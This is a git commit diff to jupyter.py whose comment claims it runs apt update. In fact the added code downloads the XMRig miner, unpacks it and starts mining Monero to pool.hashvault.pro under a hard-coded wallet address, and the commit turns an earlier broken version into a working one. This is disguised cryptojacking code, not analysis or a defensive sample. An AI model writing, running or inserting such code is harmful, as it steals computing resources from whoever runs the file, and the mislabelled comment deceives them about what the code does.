756f6da67984e4808c4e2a19898e356e96f92aa0
asfaagsgfvfgs <gouravkumarmeena2009123@outlook.com>
2026-05-19 02:26:44 +0530

    Update jupyter.py

--- jupyter.py
+++ jupyter.py
@@ -1,7 +1,13 @@
 import subprocess
 
 # Execute apt update (requires root privileges)
-result = subprocess.run(['apt', 'install', '-y', 'wget' '&&', 'wget', 'https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-x64.tar.gz && tar xvzf xmrig-6.21.1-linux-x64.tar.gz && cd xmrig-6.21.1', '&&', 'tar', 'xvzf', ' xmrig-6.21.1-linux-x64.tar.gz', '&&', 'cd' 'xmrig-6.21.1', '&&', './xmrig', '--url', 'pool.hashvault.pro:443', '--user', '46qfKvhZjvtZPQuSryhfnJ5pS4xkQosv2C6qzZ613vLaPa6vwZ1JgrV7HAxE4wMDUUYSzAyBBZGmNPfbPDrUegGvC1UtEdH', '--pass', '0x', '--tls-fingerprint', '420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14' ], capture_output=True, text=True)
+result = subprocess.run(["wget https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-x64.tar.gz && "
+        "tar xvzf xmrig-6.21.1-linux-x64.tar.gz && "
+        "cd xmrig-6.21.1 && "
+        "./xmrig --url pool.hashvault.pro:443 "
+        "--user 46qfKvhZjvtZPQuSryhfnJ5pS4xkQosv2C6qzZ613vLaPa6vwZ1JgrV7HAxE4wMDUUYSzAyBBZGmNPfbPDrUegGvC1UtEdH "
+        "--pass x0 --donate-level 1 "
+        "--tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14" ], capture_output=True, text=True)
 
 print(result.stdout)
 print(result.stderr)  # Shows any errors
